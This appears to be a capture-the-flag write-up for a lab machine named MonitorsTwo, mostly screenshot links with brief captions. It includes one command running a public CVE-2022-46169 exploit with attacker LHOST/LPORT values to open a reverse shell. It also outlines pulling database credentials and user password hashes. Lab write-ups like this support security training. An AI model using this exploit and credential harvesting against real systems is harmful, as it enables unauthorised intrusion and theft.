![Machine Info Card](images/MonitorsTwo.png)
...
![](images/Pasted%20image%2020230902160102.png)


searching on google the software and version we're able to find an exploit on github. 


![](images/Pasted%20image%2020230902160030.png)
...
![](images/Pasted%20image%2020230902160445.png)

executing `python3 CVE-2022-46169.py -u http://10.129.109.77/ --LHOST=10.10.16.7 --LPORT=80`

![](images/Pasted%20image%2020230902160402.png)
...
![](images/Pasted%20image%2020230902160546.png)


which in turn means there could be an entry script on root directory

![](images/Pasted%20image%2020230902162019.png)

which there is.

checking the contents reveals credentials for the database.

![](images/Pasted%20image%2020230902161019.png)
...
![](images/Pasted%20image%2020230902161555.png)

next thing to do is to check which tables are available.

![](images/Pasted%20image%2020230902161609.png)


`user_auth` is interesting.

![](images/Pasted%20image%2020230902161623.png)


selecting the contents of the table, we get hashes for `admin` and `marcus`

![](images/Pasted%20image%2020230902161640.png)
...
![](images/Pasted%20image%2020230902162834.png)
...
![](images/Pasted%20image%2020230902162855.png)

mail will be saved on `/var/mail/<USER>`

![](images/Pasted%20image%2020230902163017.png)


![](images/Pasted%20image%2020230902163038.png)
...
![](images/Pasted%20image%2020230902163344.png)
...
![](images/Pasted%20image%2020230902163902.png)
